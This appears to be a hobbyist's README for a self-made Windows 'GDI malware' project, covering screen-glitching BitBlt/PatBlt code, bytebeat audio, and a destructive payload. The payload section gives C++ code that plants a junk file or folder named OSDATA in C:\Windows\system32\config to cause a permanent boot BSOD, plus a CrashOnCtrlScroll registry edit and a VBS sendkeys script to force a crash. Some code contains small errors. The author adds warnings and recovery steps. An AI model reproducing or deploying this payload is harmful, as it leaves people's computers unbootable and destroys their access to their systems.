# My First-Ever GDI Malware
## <strong>Introduction</strong>
This is based on my old project, `permanent-bluescreen-cpp`, which I made. This new project contains the destructive payload from that project and uses some `BitBlt` and `PatBlt` functions.
## <strong>The GDI</strong>
GDI means Graphics-Device Interface. It is used for glitching the screen, at least what I think. As said above, it contains  `BitBlt`  and  `PatBlt`  functions. It uses this:
```cpp
for (int a = 0; a <= 30; a++)
{
    BitBlt(hdc, w, h, rand() % w + 1, rand () % h + 1, 1920, 1080, bv, STRCOPY);
    PatBlt(hdc, w, h, 1920 * 1080, PATINVERT);
}
```
And of course, it messes up the screen. It glitches and inverts color. <br>By the way, this is not destructive at all.  You run this, and reboot your system, and your computer is completely fine.
## <strong>The <big>DESTRUCTIVE</big> Payload</strong>
This is based on a Windows 10/11 registry bug <b>thing</b>. If you go to `C:\Windows\system32\config` and make a file full of junk named `OSDATA`, or a folder named `OSDATA`, and restart your computer, it will result in a <i>permanent</i> BSOD. It uses this: 
```cpp
int bv = rand() % 2; // random number between 0 and 1, not 0 and 2
system("cd C:\Windows\system32\config");
if (bv == 1)
{
    system("echo 5=fuf7GhI^=^=S y s^@ .B l u e s c r e e n^=^↓=3fdgh4c > OSDATA");
}
else
{
    system("mkdir OSDATA");
}
system("reg add HKLM\SYSTEM\CurrentControlSet\services\kbdhid\Parameters /v CrashOnCtrlScroll /d 1");
```
If `bv` is 1, then it will create the file, If not, it will create a folder. The file will return the BSOD Stop code `BAD_SYSTEM_CONFIG_INFO`. The folder will return `CONFIG_LIST_FAILED`.
## <strong>The VBS Call</strong>
If you're wondering why I used the registry snippet (not `OSDATA` but `CrashOnCtrlScroll`) is because I wanted to emulate keystrokes using VBS. The whole file contains this:
```vbs
createobject("wscript.shell").sendkeys("{CTRL}{SCROLLLOCK}{SCROLLLOCK}");
```
The call of the VBS file is done by using
```cpp
 system("cscript ctrlscrolllock.vbs //nologo");
```
## <strong>The Bytebeats</strong>
Just like other GDI malware, this has bytebeat "music" too. I made it using dollchan.net (I forgot which bytebeat snippet :P) and downloaded it as a wav file.
The evidence of sounding kind of awful is evidence that I did NOT skid or vibecode.
In my code, it uses this syntax:
```cpp
PlaySound(L".\\html5bytebeat.wav", NULL, SND_FILENAME | SND_ASYNC); // for synchronization with gdi
/*
 * claude ai made this snipet
 * my original snippet used this
 system(".\\html5bytebeat.wav"); 
*/
```
## <strong>Conclusion</strong>
This is a malicious file. Do not run this on your own computer or a school computer or whatsoever. Instead, run it on a virtual/disposable/test machine. If you found yourself running the EXE that ran the payload, boot into Windows RE and delete the OSDATA file/folder and the malware executable ( so you don't bother running it again :) ). Also, this is only compatible for Windows 10 and 11. Hopefully Microslop will make `C:\Windows\system32\config` only accessible for `NT AUTHORITY\SYSTEM` or `TrustedInstaller` instead of `Administrator` in the next version of Windows or as a security patch.
## <strong>For the Skids</strong>
Don't copy my project unless you credit me. Understand what you're doing. I know one of you very well, that is Pankoza. Pankoza skids other people's malware without credit and labels them as no-skid malware. I'm being honest, I used to be a big skid too and my Github username still is `the_script_kiddie` .
<br><br><br>
<small>bye!</small>
